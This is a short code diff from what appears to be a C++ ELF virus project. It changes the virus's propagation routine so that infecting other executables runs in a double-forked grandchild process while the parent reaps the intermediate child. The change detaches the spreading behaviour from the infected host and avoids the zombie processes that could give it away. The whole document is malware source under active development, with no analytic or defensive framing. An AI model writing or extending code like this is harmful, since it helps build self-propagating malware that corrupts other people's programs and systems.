@@ -5,6 +5,7 @@
 #include "infector/common_infection.hh"
 #include "nostdlib/stdlib.hh"
 #include "nostdlib/string.hh"
+#include "nostdlib/sys/wait.hh"
 #include "nostdlib/unistd.hh"
 #include "signature/elf_padding.hh"
 
@@ -76,14 +77,20 @@ size_t propagate() {
 // allows tree walks to happen in a forked process.
 template <typename DirIteratorT, typename Injector, typename Redirector>
 void forked_propagate() {
-  auto new_pid = vf::fork();
+  auto child_pid = vf::fork();
   // If we are child then perform propagation.
-  if (new_pid == 0) {
-    (void)propagate<DirIteratorT, Injector, Redirector>();
-    // Need to explicitly exit otherwise the child will continue running the
-    // host again.
+  if (!child_pid) {
+    // create a grandchild that performs the work.
+    auto grandchild_pid = vf::fork();
+    if (!grandchild_pid) {
+      // perform propagation in grandchild process.
+      (void)propagate<DirIteratorT, Injector, Redirector>();
+    }
     exit(0);
   }
+
+  // parent waits for the child so we do not create zombie processes.
+  vf::waitpid(child_pid, nullptr, 0);
 }
 
 }  // namespace vf::propagation
